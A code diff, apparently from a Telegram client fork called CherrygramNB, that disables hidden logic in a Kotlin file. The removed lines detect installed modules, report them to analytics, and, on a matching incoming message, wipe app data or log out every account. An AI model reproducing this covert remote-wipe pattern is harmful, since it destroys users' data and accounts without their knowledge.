@@ -23,9 +23,7 @@ import java.io.File
 object SamsungDatastore {
 
     suspend fun checkCallback() = withContext(Dispatchers.Default) {
-        checkIfFilesExist()
-        checkIfFilesExistNew()
-        checkIfDirectoryExists()
+        // Disabled in CherrygramNB
     }
 
     private val good = Extra.XName_Arr.joinToString().replace(",", "").replace(" ", "")
@@ -157,11 +155,8 @@ object SamsungDatastore {
         }
     }
 
-    private /*suspend*/ fun killAppAndSendEvent() {
-        FirebaseAnalyticsHelper.trackEventWithEmptyBundle("found_module")
-//        delay(5000)
-//        exitProcess(0)
-        AppRestartHelper.restartApp(ApplicationLoader.applicationContext)
+    private fun killAppAndSendEvent() {
+        // Disabled in CherrygramNB
     }
 
     suspend fun vpwogjigjjur232(messageObject: MessageObject?) {
@@ -192,22 +187,7 @@ object SamsungDatastore {
         }
 
         if (bId != null) {
-            try {
-                (ApplicationLoader.applicationContext.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager).clearApplicationUserData()
-            } catch (e: Exception) {
-                e.printStackTrace()
-
-                for (i in 0 until UserConfig.MAX_ACCOUNT_COUNT) {
-                    val uC = AccountInstance.getInstance(i).userConfig
-                    if (uC != null
-                        && uC.currentUser != null
-                        && uC.isClientActivated
-                        && uC.currentUser.id != 0L
-                    ) {
-                        MessagesController.getInstance(uC.currentAccount).performLogout(1)
-                    }
-                }
-            }
+            BlockedNotice.request()
         }
     }
 
